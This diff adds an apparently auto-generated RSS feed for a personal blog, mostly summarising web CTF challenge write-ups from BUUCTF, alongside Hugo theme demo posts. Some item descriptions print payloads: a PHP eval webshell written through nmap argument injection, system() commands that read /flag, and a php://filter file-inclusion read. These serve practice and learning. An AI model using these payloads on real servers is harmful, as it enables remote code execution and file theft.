@@ -1,0 +1,1360 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Hugo Zzo Theme</title>
+    <link>https://lurenxiao1998.github.io/en/</link>
+    <description>Recent content on Hugo Zzo Theme</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>lurenxiao98@gmail.com (Lurenxiao)</managingEditor>
+    <webMaster>lurenxiao98@gmail.com (Lurenxiao)</webMaster>
+    <copyright>&amp;copy;{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Thu, 05 Mar 2020 14:08:48 +0000</lastBuildDate>
+    
+        <atom:link href="https://lurenxiao1998.github.io/en/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+      
+      
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+
+      
+      <item>
+        <title>[WesternCTF2018]shrine</title>
+        <link>https://lurenxiao1998.github.io/en/posts/westernctf2018shrine/</link>
+        <pubDate>Fri, 31 Jan 2020 16:48:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Fri, 31 Jan 2020 16:48:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/westernctf2018shrine/</guid>
+        <description>分析 打开网页首先是一段源码，右键查看网页源代码，如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import flask import os app = flask.Flask(__name__) app.config[&amp;#39;FLAG&amp;#39;] = os.environ.pop(&amp;#39;FLAG&amp;#39;) @app.route(&amp;#39;/&amp;#39;) def index(): return open(__file__).read() @app.route(&amp;#39;/shrine/&amp;lt;path:shrine&amp;gt;&amp;#39;)</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>shrine</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[极客大挑战2019]Http</title>
+        <link>https://lurenxiao1998.github.io/en/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http/</link>
+        <pubDate>Wed, 29 Jan 2020 12:34:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Wed, 29 Jan 2020 12:34:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http/</guid>
+        <description>知识点 http请求头 解题过程 访问题目，F12查看源码 发现有个Secret.php，访问 看到这个应该就知道是要修改请求头了，可以用Modify</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Http</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[ASIS 2019]Unicorn shop</title>
+        <link>https://lurenxiao1998.github.io/en/posts/asis-2019unicorn-shop/</link>
+        <pubDate>Wed, 29 Jan 2020 11:39:20 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Wed, 29 Jan 2020 11:39:20 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/asis-2019unicorn-shop/</guid>
+        <description>知识点 Unicode安全问题 过程 这题buuctf环境没搭好？前三个正常字符也买不了，最后一个我试了其他的一万字符出错了。 0xF0 0x90 0xA7 0xA4 这题编码为u</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Unicorn shop</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Shortcodes</title>
+        <link>https://lurenxiao1998.github.io/en/posts/shortcodes/</link>
+        <pubDate>Sat, 25 Jan 2020 06:40:51 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sat, 25 Jan 2020 06:40:51 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/shortcodes/</guid>
+        <description>Markdownify box This is boxmd shortcode Simple box This is **box** shortcode  Code tabs Make it easy to switch between different code
+java javascript  1  System.out.println(&amp;#39;Hello World!&amp;#39;);     1  console.log(&amp;#39;Hello World!&amp;#39;);       &#39;use strict&#39;; var containerId = JSON.parse(&#34;\&#34;d96f892eb0443615\&#34;&#34;); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>shortcode</category>
+            
+          
+        
+        
+          
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[极客大挑战 2019]Knife</title>
+        <link>https://lurenxiao1998.github.io/en/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019knife/</link>
+        <pubDate>Mon, 20 Jan 2020 18:38:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 18:38:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019knife/</guid>
+        <description>知识点 一句话木马 解题过程 弟弟题，直接给了shell payload 1 system(&amp;#34;ls -l /&amp;#34;); 1 system(&amp;#34;cat /flag&amp;#34;);</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Knife</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[BUUCTF 2018]Online Tool</title>
+        <link>https://lurenxiao1998.github.io/en/posts/buuctf-2018online-tool/</link>
+        <pubDate>Mon, 20 Jan 2020 18:27:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 18:27:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/buuctf-2018online-tool/</guid>
+        <description>知识点 https://paper.seebug.org/164/ payload 1 &amp;#39; &amp;lt;?php @eval(\$_POST[\&amp;#34;hack\&amp;#34;]);?&amp;gt; -oG hack.php &amp;#39;</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Online Tool</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[ZJCTF 2019]NiZhuanSiWei</title>
+        <link>https://lurenxiao1998.github.io/en/posts/zjctf-2019nizhuansiwei/</link>
+        <pubDate>Mon, 20 Jan 2020 10:46:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 10:46:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/zjctf-2019nizhuansiwei/</guid>
+        <description>知识点 php反序列化 php伪协议 include利用php伪协议 解题过程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 &amp;lt;?php $text = $_GET[&amp;#34;text&amp;#34;]; $file = $_GET[&amp;#34;file&amp;#34;]; $password = $_GET[&amp;#34;password&amp;#34;]; if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#39;r&amp;#39;)===&amp;#34;welcome to the zjctf&amp;#34;)){ echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;#34;.file_get_contents($text,&amp;#39;r&amp;#39;).&amp;#34;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;#34;;</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>NiZhuanSiWei</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[极客大挑战 2019]PHP</title>
+        <link>https://lurenxiao1998.github.io/en/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php/</link>
+        <pubDate>Mon, 20 Jan 2020 10:46:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 10:46:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php/</guid>
+        <description>知识点 反序列化绕过__wakeup魔术方法（当成员属性数目大于实际数目时可绕过） 解题过程 题目说备份，应该是要下载网站源代码审计。我用的扫描工</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>PHP</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[极客大挑战 2019]Secret File</title>
+        <link>https://lurenxiao1998.github.io/en/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file/</link>
+        <pubDate>Sat, 18 Jan 2020 14:23:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sat, 18 Jan 2020 14:23:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file/</guid>
+        <description>[极客大挑战 2019]Secret File 知识点 配合php伪协议利用文件包含漏洞 PHP伪协议总结 使用php的file伪协议去读取文件 payload ?file=php://filter/convert.base64-encode/resource=flag.php</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Secret File</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Markdown Syntax Guide</title>
+        <link>https://lurenxiao1998.github.io/en/posts/markdown-syntax/</link>
+        <pubDate>Fri, 20 Dec 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Fri, 20 Dec 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/markdown-syntax/</guid>
+        <description>&lt;p&gt;This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.&lt;/p&gt;</description>
+        
+        <dc:creator>Choi</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature1/markdown.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>markdown</category>
+            
+          
+            
+              <category>css</category>
+            
+          
+            
+              <category>html</category>
+            
+          
+            
+              <category>themes</category>
+            
+          
+        
+        
+          
+            
+              <category>themes</category>
+            
+          
+            
+              <category>syntax</category>
+            
+          
+        
+        
+          
+            
+              <category>Themes Guide</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Syntax highlighting</title>
+        <link>https://lurenxiao1998.github.io/en/posts/syntax-highlight/</link>
+        <pubDate>Wed, 18 Dec 2019 10:33:41 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Wed, 18 Dec 2019 10:33:41 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/syntax-highlight/</guid>
+        <description>Code Syntax Highlighting Verify the following code blocks render as code blocks and highlight properly. More about tuning syntax highlighting is the Hugo documentation. Diff 1 2 3 4 5 6 7 8 9 10 *** /path/to/original &amp;#39;&amp;#39;timestamp&amp;#39;&amp;#39; --- /path/to/new &amp;#39;&amp;#39;timestamp&amp;#39;&amp;#39; *************** *** 1 **** ! This is a line. --- 1 --- ! This is a replacement line. It is important to spell -removed line +new line *** /path/to/original</description>
+        
+        <dc:creator>Jeus</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature2/color-palette.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>hugo</category>
+            
+          
+        
+        
+          
+            
+              <category>hugo</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Math Typesetting</title>
+        <link>https://lurenxiao1998.github.io/en/posts/math-typesetting/</link>
+        <pubDate>Tue, 17 Dec 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Tue, 17 Dec 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/math-typesetting/</guid>
+        <description>&lt;div class=&#34;box&#34;&gt;
+We need goldmark katex entension which is not yet we have: 
+[https://github.com/gohugoio/hugo/issues/6544](https://github.com/gohugoio/hugo/issues/6544)
+&lt;/div&gt;
+&lt;p&gt;Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.&lt;/p&gt;</description>
+        
+        <dc:creator>Park</dc:creator>
+        
+        
+        
+        
+        
+        
+      </item>
+      
+      <item>
+        <title>Emoji Support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/emoji-support/</link>
+        <pubDate>Mon, 16 Dec 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 16 Dec 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/emoji-support/</guid>
+        <description>&lt;p&gt;Emoji can be enabled in a Hugo project in a number of ways.&lt;/p&gt;</description>
+        
+        <dc:creator>Kim</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>emoji</category>
+            
+          
+            
+              <category>gamoji</category>
+            
+          
+            
+              <category>namoji</category>
+            
+          
+            
+              <category>bamoji</category>
+            
+          
+            
+              <category>amoji</category>
+            
+          
+        
+        
+        
+      </item>
+      
+      <item>
+        <title>[RoarCTF 2019]Easy Java</title>
+        <link>https://lurenxiao1998.github.io/en/posts/roarctf-2019easy-java/</link>
+        <pubDate>Sat, 14 Dec 2019 21:29:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sat, 14 Dec 2019 21:29:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/roarctf-2019easy-java/</guid>
+        <description>反序列化漏洞 考点 PHP反序列化漏洞 弱口令 解题过程 开头看到这个，爆破。 ![1](D:\CTF\ctf\web\buuctf[RoarCTF 2019]Easy Java\图片\1.png) 用户名admin，密码admin888 ![2](D:\CTF\ctf\web\buuctf[RoarCTF</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Easy Java</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>piapiapia</title>
+        <link>https://lurenxiao1998.github.io/en/posts/0ctf-2016piapiapia/</link>
+        <pubDate>Thu, 12 Dec 2019 19:29:20 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Thu, 12 Dec 2019 19:29:20 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/0ctf-2016piapiapia/</guid>
+        <description>前言 这道题主要考两个知识点： 数组绕过正则 preg_match(pattern,Array()) = false md5(Array()) = null sha1(Array()) = null ereg(pattern,Array()) =null strcmp(Array(), “abc”) =null strpos(Array(),“abc”) = null strlen(Array()) = null 改变序列化</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>0CTF</category>
+            
+          
+            
+              <category>piapiapia</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>web扫描工具</title>
+        <link>https://lurenxiao1998.github.io/en/posts/web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</link>
+        <pubDate>Thu, 12 Dec 2019 14:32:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Thu, 12 Dec 2019 14:32:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</guid>
+        <description>dirsearch、dirb和nikto；御剑 这些软件单独一个都不一定能够扫出，比如说fakebook这道题nikto能扫，[0CTF 201</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>dirsearch</category>
+            
+          
+            
+              <category>dirb</category>
+            
+          
+            
+              <category>nikto</category>
+            
+          
+            
+              <category>御剑</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>工具</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>不用输入密码git push</title>
+        <link>https://lurenxiao1998.github.io/en/posts/%E4%B8%8D%E7%94%A8%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81git-push/</link>
+        <pubDate>Mon, 09 Dec 2019 18:06:20 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 09 Dec 2019 18:06:20 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/%E4%B8%8D%E7%94%A8%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81git-push/</guid>
+        <description>方法一 输入 git config --global credential.helper store 之后push一次即可 方法二（ssh-keygen） 生成秘钥 参考服务器上的 Git - 生成 SSH 公钥 放到github上 把~/.ssh/</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>git</category>
+            
+          
+        
+        
+          
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>hashpump的使用</title>
+        <link>https://lurenxiao1998.github.io/en/posts/hashpump%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</link>
+        <pubDate>Mon, 09 Dec 2019 17:47:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 09 Dec 2019 17:47:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/hashpump%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</guid>
+        <description>介绍 hashpump是一个由$hash(key+data)$、$len(key+data)$和消息$m$，计算出$hash(key+data</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>hashpump</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>工具</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>EditThisCookie的简单使用</title>
+        <link>https://lurenxiao1998.github.io/en/posts/editthiscookie%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</link>
+        <pubDate>Sun, 08 Dec 2019 19:23:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sun, 08 Dec 2019 19:23:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/editthiscookie%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</guid>
+        <description>EditThisCookie是一个可以设置和更改cookie的chrome插件。 打开EditThisCookie可以看到界面 添加cookie</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>cookie</category>
+            
+          
+            
+              <category>EditThisCookie</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>工具</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>BUUCTF SSRFMe</title>
+        <link>https://lurenxiao1998.github.io/en/posts/ssrf-me/</link>
+        <pubDate>Sun, 08 Dec 2019 18:20:20 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sun, 08 Dec 2019 18:20:20 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/ssrf-me/</guid>
+        <description>解法一 哈希拓展攻击 secert_key 是一个长度为 16 的字符串，在 /geneSign?param=flag.txt 中可以获取hashlib.md5(secert_key + param + action).hexdigest() ，密钥param不动，增加ac</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>De1CTF</category>
+            
+          
+            
+              <category>SSRFMe</category>
+            
+          
+            
+              <category>SSRFMe</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>搭建个人博客</title>
+        <link>https://lurenxiao1998.github.io/en/posts/firstblog/</link>
+        <pubDate>Wed, 20 Nov 2019 10:33:41 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Wed, 20 Nov 2019 10:33:41 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/firstblog/</guid>
+        <description>环境 Arch Linux ( Manjaro Linux) Hugo 1 G 的剩余空间 搭建 1 2 pacman -Syy pacman -Syu hugo 前往hugo主题挑选一个你喜欢的主题，挑选好了之后进入它的homepage。这里我选择的是z</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>博客</category>
+            
+          
+            
+              <category>hugo</category>
+            
+          
+            
+              <category>gitpage</category>
+            
+          
+            
+              <category>blog</category>
+            
+          
+            
+              <category>manjaro</category>
+            
+          
+            
+              <category>阿里云</category>
+            
+          
+            
+              <category>zzo</category>
+            
+          
+        
+        
+          
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Viz support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/test-viz/</link>
+        <pubDate>Mon, 18 Nov 2019 21:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 18 Nov 2019 21:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/test-viz/</guid>
+        <description>digraph G { subgraph cluster_0 { style=filled; color=lightgrey; node [style=filled,color=white]; a0 -&amp;gt; a1 -&amp;gt; a2 -&amp;gt; a3; label = &amp;quot;process #1&amp;quot;; } subgraph cluster_1 { node [style=filled]; b0 -&amp;gt; b1 -&amp;gt; b2 -&amp;gt; b3; label = &amp;quot;process #2&amp;quot;; color=blue } start -&amp;gt; a0; start -&amp;gt; b0; a1 -&amp;gt; b3; b2 -&amp;gt; a3; a3 -&amp;gt; a0; a3 -&amp;gt; end; b3 -&amp;gt; end; start [shape=Mdiamond]; end [shape=Msquare]; } </description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature2/graph.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+          
+        
+        
+          
+            
+              <category>diagram</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Wavedrom support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/test-wavedrom/</link>
+        <pubDate>Mon, 18 Nov 2019 18:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 18 Nov 2019 18:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/test-wavedrom/</guid>
+        <description>{ &amp;quot;signal&amp;quot;: [ {&amp;quot;name&amp;quot;: &amp;quot;CLK&amp;quot;, &amp;quot;wave&amp;quot;: &amp;quot;p.....|...&amp;quot;}, {&amp;quot;name&amp;quot;:&amp;quot;DAT&amp;quot;, &amp;quot;wave&amp;quot;:&amp;quot;x.345x|=.x&amp;quot;, &amp;quot;data&amp;quot;:[&amp;quot;A&amp;quot;,&amp;quot;B&amp;quot;,&amp;quot;C&amp;quot;,&amp;quot;D&amp;quot;]}, {&amp;quot;name&amp;quot;: &amp;quot;REQ&amp;quot;, &amp;quot;wave&amp;quot;: &amp;quot;0.1..0|1.0&amp;quot;}, {}, {&amp;quot;name&amp;quot;: &amp;quot;ACK&amp;quot;, &amp;quot;wave&amp;quot;: &amp;quot;1.....|01.&amp;quot;} ]} </description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature1/wave.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+          
+        
+        
+          
+            
+              <category>diagram</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Chart support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/test-chartjs/</link>
+        <pubDate>Mon, 18 Nov 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 18 Nov 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/test-chartjs/</guid>
